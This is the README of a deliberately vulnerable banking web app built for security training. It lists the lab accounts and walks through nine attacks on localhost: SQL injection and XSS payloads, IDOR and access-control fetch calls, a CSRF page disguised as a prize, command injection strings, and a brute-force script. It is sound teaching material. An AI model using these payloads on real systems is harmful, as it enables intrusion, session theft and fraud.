# InsecureBank - Vulnerable Banking Application

A deliberately vulnerable banking application for educational purposes demonstrating common web security vulnerabilities.

## ⚠️ Disclaimer

**This application contains intentional security vulnerabilities. Use only for educational purposes in controlled environments.**


## 👥 User Credentials

| Username | Password | Role |
|----------|----------|------|
| `admin` | `admin123` | Administrator |
| `john_doe` | `password` | User |
| `jane_smith` | `123456` | User |
| `bob_wilson` | `Bobbbb` | User |
| `ycp27` | `ycp123` | User |

---

## 🎯 Attack Demonstrations

### 1. SQL Injection Attack

**Authentication Bypass**

SQL Injection allows attackers to manipulate database queries by injecting malicious SQL code through input fields.

**Test Case:**
- Navigate to login page
- Username: `admin'--  OR '1'='1`
- Password: `anything`
- Result: Bypasses authentication without valid credentials

**Why it works:** The injected SQL creates a condition that's always true, breaking the intended query logic.

---

### 2. Cross-Site Scripting (XSS) Attack

**Stored XSS in Profile**

XSS allows attackers to inject malicious scripts that execute in other users' browsers, potentially stealing session data.

**Test Case:**
- Login as any user
- Navigate to Profile Management
- Full Name field: `<img src=x onerror=alert('XSS')>`
- Update profile
- When admin views this profile, the script executes

**Payloads to try:**
```html
<img src=x onerror=alert(document.cookie)>
<script>alert('XSS')</script>
<svg/onload=alert('XSS')>
```

---

### 3. Insecure Direct Object Reference (IDOR)

**Unauthorized Data Access**

IDOR vulnerabilities allow attackers to access resources belonging to other users by manipulating object references.

**Test Case - View Other Users' Transactions:**
- Login as `john_doe` (ID: 2)
- Open browser console (F12)
- Execute:
```javascript
fetch('http://localhost:5000/api/transactions/1', {
  credentials: 'include'
}).then(r => r.json()).then(console.log)
```
- Result: Access admin's transactions without authorization

**Test Case - Modify Other Users' Profiles:**
```javascript
fetch('http://localhost:5000/api/profile/1', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({
    fullName: 'Modified Name',
    email: 'modified@email.com'
  })
}).then(r => r.json()).then(console.log)
```

---

### 4. Cross-Site Request Forgery (CSRF)

**Unauthorized Actions**

CSRF tricks authenticated users into performing unintended actions by exploiting their active session.

**Test Case - Malicious Money Transfer:**

Create `csrf-attack.html`:
```html
<!DOCTYPE html>
<html>
<body>
    <h1>You Won a Prize!</h1>
    <form id="csrf" action="http://localhost:5000/api/transfer" method="POST" style="display:none;">
        <input name="recipient" value="ycp27">
        <input name="amount" value="1000">
    </form>
    <script>
        setTimeout(() => document.getElementById('csrf').submit(), 1000);
    </script>
</body>
</html>
```
- Victim opens this page while logged into the bank
- Result: Money transferred without victim's knowledge

---

### 5. Command Injection Attack

**Remote Code Execution**

Command injection allows attackers to execute arbitrary system commands on the server.

**Test Case - System Tools Exploitation:**
- Navigate to System Tools
- Host/IP field: `8.8.8.8 && whoami`
- Result: Executes system command and reveals server user

**Additional payloads:**
```bash
8.8.8.8 && dir          # List directory contents
8.8.8.8 && ipconfig     # Network configuration
8.8.8.8 && systeminfo   # System information
```

---

### 6. Broken Access Control

**Privilege Escalation**

Missing authorization checks allow regular users to access admin-only functionality.

**Test Case - Access Admin Data:**
- Login as regular user
- Open browser console
- Execute:
```javascript
fetch('http://localhost:5000/api/admin/users', {
  credentials: 'include'
}).then(r => r.json()).then(console.log)
```
- Result: Regular user retrieves admin-only data

**Test Case - Delete Users:**
```javascript
fetch('http://localhost:5000/api/admin/user/3', {
  method: 'DELETE',
  credentials: 'include'
}).then(r => r.json()).then(console.log)
```

---

### 7. Session Hijacking

**Cookie Theft via XSS**

Combining XSS with cookie theft allows attackers to impersonate victims.

**Test Case:**
- Inject in profile: `<img src=x onerror="alert(document.cookie)">`
- When admin views profile, session cookie is exposed
- Attacker can use this cookie to impersonate the admin

**Manual Cookie Manipulation:**
- F12 → Application → Cookies
- Change `userId` value to `1` (admin)
- Refresh page
- Result: Potential admin access

---

### 8. Brute Force Attack

**Password Guessing**

Absence of rate limiting allows unlimited login attempts.

**Test Case:**
```javascript
const passwords = ['admin', 'admin123', 'password', '123456'];

async function bruteForce() {
  for (let pwd of passwords) {
    const response = await fetch('http://localhost:5000/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'admin', password: pwd })
    });
    const data = await response.json();
    if (data.message === 'Login successful') {
      console.log('Found password:', pwd);
      break;
    }
  }
}
bruteForce();
```

---

### 9. Information Disclosure

**Sensitive Data Exposure**

API responses contain sensitive information that should never be exposed to clients.

**Test Case:**
- Login and open Network tab (F12)
- Observe API responses
- Result: Plain text passwords and sensitive user data visible

```javascript
fetch('http://localhost:5000/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'admin', password: 'admin123' })
}).then(r => r.json()).then(console.log)
```
Response includes password in plain text!

---

## � Learning Resources

## 📚 Learning Resources

- **OWASP Top 10** - [https://owasp.org/Top10/](https://owasp.org/Top10/)
- **PortSwigger Web Security Academy** - [https://portswigger.net/web-security](https://portswigger.net/web-security)

---

**⚠️ Use only for educational purposes in controlled environments. Never test on systems without authorization.**

**Repository**: [https://github.com/Yrcd27/Insecure-Bank](https://github.com/Yrcd27/Insecure-Bank)
